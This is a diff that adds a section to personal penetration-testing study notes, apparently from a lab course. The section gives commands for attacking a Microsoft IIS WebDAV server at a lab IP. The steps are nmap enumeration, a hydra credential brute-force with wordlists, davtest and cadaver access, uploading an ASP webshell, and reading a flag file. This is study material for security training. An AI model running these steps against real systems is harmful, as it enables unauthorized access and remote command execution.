@@ -559,6 +559,37 @@ systeminfo
 
 ### Host & Network Penetration Testing: System/Host Based Attacks
 ```
+Miscrosoft IIS 80/443
+WebDAV        80/443
+SMB           445
+RDP           3389
+WinRM         5986/443
+
+
+Exploiting Miscrosoft IIS WebDAV
+---------------------------------
+nmap -sVC  10.2.17.124
+Microsoft IIS httpd //found
+nmap -sV -p 80 --script=http-enum 10.2.17.124
+
+hydra  -L /usr/share/wordlist/metasploit/common_users.txt -P /usr/share/wordlist/metasploit/common_password.txt 10.2.17.124 http-get
+/webdav/
+
+davtest //tool
+davtest -auth bob:password_123321 -url http://10.2.17.124/webdav
+cadaver --help
+cadaver http://10.2.17.124/webdav
+username and passowrd
+ls
+new tab  ...
+ls -al /usr/share/webshells/
+ls -al /usr/share/webshells/asp/
+put /usr/share/webshells/asp/webshel.asp
+lonch the asp webshells>>>>>>>>>>>
+whoami
+ifconfig
+dir C:\
+type C:\flag.txt
 
 ```
 ## (D) Web Application Penetration Testing
